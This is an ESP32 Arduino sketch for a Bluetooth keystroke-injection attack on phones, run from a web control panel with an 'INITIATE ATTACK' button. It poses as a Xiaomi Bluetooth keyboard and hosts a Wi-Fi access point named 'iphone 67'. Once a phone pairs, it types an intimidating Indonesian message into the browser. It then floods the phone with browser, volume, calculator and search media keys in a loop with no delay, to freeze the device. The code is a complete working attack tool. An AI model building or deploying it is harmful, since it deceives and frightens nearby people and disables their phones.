/**
 * PROJECT: EXTROS V3 (GOD MODE LAG)
 * TARGET: ESP32 DevKit V1
 * UI: Cyber Command Center
 * ATTACK: App Bombing + Volume Flood
 */

#include <WiFi.h>
#include <WebServer.h>
#include <BleKeyboard.h> 

// ==========================================
// 1. KONFIGURASI NETWORK
// ==========================================
const char* ap_ssid = "iphone 67";      
const char* ap_password = "12345678";   

// Nama Bluetooth Target
BleKeyboard bleKeyboard("Hyper Os 3", "Xiaomi", 100);

WebServer server(80);
const int ledPin = 2; // LED DevKit V1
bool isChaosMode = false;

// ==========================================
// 2. UI EXTROS V3 (COMMAND CENTER)
// ==========================================
const char index_html[] PROGMEM = R"=====(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EXTROS V3</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&display=swap');
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { 
            background-color: #050505; 
            color: #00ff41; 
            font-family: 'Rajdhani', sans-serif; 
            margin: 0; 
            display: flex; 
            justify-content: center; 
            min-height: 100vh;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px);
            background-size: 20px 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            padding: 20px;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        /* HEADER */
        .header {
            border-bottom: 2px solid #00ff41;
            padding-bottom: 10px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: flex-end;
        }
        .title { font-size: 32px; font-weight: 700; letter-spacing: 2px; text-shadow: 0 0 10px rgba(0,255,65,0.5); }
        .version { font-size: 12px; opacity: 0.7; }

        /* RADAR BOX */
        .radar-box {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff41;
            height: 120px;
            position: relative;
            overflow: hidden;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }
        .radar-scan {
            position: absolute;
            width: 100%;
            height: 2px;
            background: #00ff41;
            box-shadow: 0 0 10px #00ff41;
            animation: scan 2s linear infinite;
            top: 0;
            opacity: 0.5;
        }
        @keyframes scan { 0% {top:0;} 100% {top:100%;} }
        
        .target-info { z-index: 2; text-align: center; }
        .status-big { font-size: 24px; font-weight: bold; letter-spacing: 1px; }
        .status-sub { font-size: 14px; opacity: 0.8; margin-top: 5px; }

        /* BLINK ANIMATION */
        .blink-red { animation: blinkR 0.2s infinite; color: #ff0000; text-shadow: 0 0 10px red; }
        .text-green { color: #00ff41; }
        .text-gray { color: #555; }
        @keyframes blinkR { 0% {opacity:1;} 50% {opacity:0.5;} }

        /* BUTTONS */
        .btn-group { display: flex; flex-direction: column; gap: 15px; margin-top: 10px; }
        
        button {
            background: transparent;
            border: 2px solid #00ff41;
            color: #00ff41;
            padding: 20px;
            font-family: 'Rajdhani', sans-serif;
            font-size: 20px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 2px;
            cursor: pointer;
            transition: 0.2s;
            clip-path: polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
        }

        .btn-attack {
            background: rgba(0, 255, 65, 0.1);
            box-shadow: 0 0 15px rgba(0,255,65,0.1);
        }
        .btn-attack:active {
            background: #00ff41;
            color: #000;
            transform: scale(0.98);
        }

        .btn-stop {
            border-color: #ff3333;
            color: #ff3333;
            background: rgba(255, 51, 51, 0.1);
        }
        .btn-stop:active {
            background: #ff3333;
            color: #000;
            transform: scale(0.98);
        }

        /* LOG TERMINAL */
        .terminal {
            background: #000;
            border: 1px solid #333;
            height: 150px;
            padding: 10px;
            font-family: monospace;
            font-size: 12px;
            overflow-y: auto;
            color: #aaa;
            margin-top: 10px;
            border-left: 4px solid #00ff41;
        }
        .log-line { margin-bottom: 2px; }
        .log-time { color: #555; margin-right: 5px; }
        .highlight { color: #fff; font-weight: bold; }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="title">EXTROS</div>
            <div class="version">V3.0 // SYSTEM</div>
        </div>

        <div class="radar-box">
            <div class="radar-scan"></div>
            <div class="target-info">
                <div id="mainStatus" class="status-big text-gray">SEARCHING...</div>
                <div id="subStatus" class="status-sub">WAITING FOR TARGET</div>
            </div>
        </div>

        <div class="btn-group">
            <button class="btn-attack" onclick="launchAttack()">
                ⚠️ INITIATE ATTACK
            </button>
            <button class="btn-stop" onclick="stopAttack()">
                ✖ SYSTEM RESET
            </button>
        </div>

        <div class="terminal" id="console">
            <div class="log-line">> SYSTEM INITIALIZED...</div>
        </div>
    </div>

    <script>
        function log(msg) {
            const term = document.getElementById('console');
            const time = new Date().toLocaleTimeString('en-GB').split(' ')[0];
            term.innerHTML += `<div class="log-line"><span class="log-time">[${time}]</span> ${msg}</div>`;
            term.scrollTop = term.scrollHeight;
        }

        function launchAttack() {
            log("SENDING PAYLOAD...");
            if(navigator.vibrate) navigator.vibrate(100);
            
            fetch('/start').then(r => {
                log("<span class='highlight'>PAYLOAD DELIVERED.</span>");
                log("Waiting for psychological trigger...");
            });
        }

        function stopAttack() {
            log("RESETTING CONNECTION...");
            if(navigator.vibrate) navigator.vibrate([50,50]);
            
            fetch('/stop').then(r => {
                log("SYSTEM NORMAL.");
            });
        }

        setInterval(() => {
            fetch('/status').then(r => r.json()).then(d => {
                const main = document.getElementById('mainStatus');
                const sub = document.getElementById('subStatus');
                
                if(d.chaos) {
                    main.innerText = "!!! DEADLOCK ACTIVE !!!";
                    main.className = "status-big blink-red";
                    sub.innerText = "CPU & RAM FLOODING...";
                } else if(d.conn) {
                    if(main.innerText !== "!!! DEADLOCK ACTIVE !!!") {
                        main.innerText = "TARGET LOCKED";
                        main.className = "status-big text-green";
                        sub.innerText = "CONNECTED: READY TO FIRE";
                    }
                } else {
                    main.innerText = "SEARCHING...";
                    main.className = "status-big text-gray";
                    sub.innerText = "WAITING FOR BLUETOOTH";
                }
            });
        }, 1000);
    </script>
</body>
</html>
)=====";

// ==========================================
// 3. LOGIKA BRUTAL (BACKEND)
// ==========================================

void typeSlow(String text) {
  for(int i = 0; i < text.length(); i++) {
    bleKeyboard.print(text[i]);
    delay(40); // Ngetik agak cepet dikit biar gak kelamaan
  }
}

void handleStart() {
  if(!bleKeyboard.isConnected()) return;
  digitalWrite(ledPin, HIGH); 
  
  // -- FASE 1: BUKA AKSES --
  bleKeyboard.write(KEY_MEDIA_VOLUME_UP);
  delay(200);
  bleKeyboard.write(KEY_MEDIA_WWW_HOME); 
  delay(2500); 
  
  // Fokus URL
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.print("l"); bleKeyboard.releaseAll();
  delay(500);
  
  // Bersih-bersih
  bleKeyboard.print(" "); delay(50);
  bleKeyboard.press(KEY_LEFT_CTRL); bleKeyboard.print("a"); bleKeyboard.releaseAll();
  delay(50);
  bleKeyboard.write(KEY_BACKSPACE);
  delay(200);

  // -- FASE 2: PESAN TEROR --
  typeSlow("Jangan AKtifkan Bluetooth Mu Sembarangan... ");
  delay(400);
  typeSlow("Lebih Waspada");
  delay(400);
  typeSlow("Menjauh Lah Dari Tempat Ini JIka Ingin Ponesel Mu Normal Kembali");
  
  delay(500);
  bleKeyboard.write(KEY_RETURN); 
  
  // -- FASE 3: DEADLOCK TRIGGER --
  delay(4000); // Kasih waktu baca 4 detik
  
  isChaosMode = true; // AKTIFKAN MODE RUSUH
  server.send(200, "text/plain", "CHAOS");
}

void handleStop() {
  isChaosMode = false;
  digitalWrite(ledPin, LOW); 
  server.send(200, "text/plain", "STOP");
}

void handleStatus() {
  String json = "{";
  json += "\"conn\":" + String(bleKeyboard.isConnected()?"true":"false") + ",";
  json += "\"chaos\":" + String(isChaosMode?"true":"false");
  json += "}";
  server.send(200, "application/json", json);
}

void setup() {
  Serial.begin(115200);
  pinMode(ledPin, OUTPUT);
  digitalWrite(ledPin, LOW);
  
  bleKeyboard.begin();
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  
  server.on("/", [](){ server.send(200, "text/html", index_html); });
  server.on("/start", handleStart);
  server.on("/stop", handleStop);
  server.on("/status", handleStatus);
  server.begin();
}

// ==========================================
// 4. THE KILLER LOOP (APP BOMBING - FIXED)
// ==========================================
void loop() {
  server.handleClient();
  
  if (isChaosMode && bleKeyboard.isConnected()) {
    // --- TEKNIK APP BOMBING ---
    
    // 1. Force Browser (Buka Chrome/Browser)
    bleKeyboard.write(KEY_MEDIA_WWW_HOME);
    
    // 2. Force Volume Overlay (Bikin UI ketutup bar volume)
    bleKeyboard.write(KEY_MEDIA_VOLUME_UP);
    bleKeyboard.write(KEY_MEDIA_VOLUME_DOWN);
    
    // 3. Force Calculator (Paksa buka Kalkulator)
    bleKeyboard.write(KEY_MEDIA_CALCULATOR);
    
    // 4. GANTI EMAIL JADI SEARCH (FIX ERROR)
    // KEY_MEDIA_EMAIL diganti KEY_MEDIA_WWW_SEARCH
    // Ini bakal maksa buka Google Search/Assistant (Berat banget di RAM)
    bleKeyboard.write(KEY_MEDIA_WWW_SEARCH);
    
    // 0 Delay. CPU HP bakal panik.
  }
}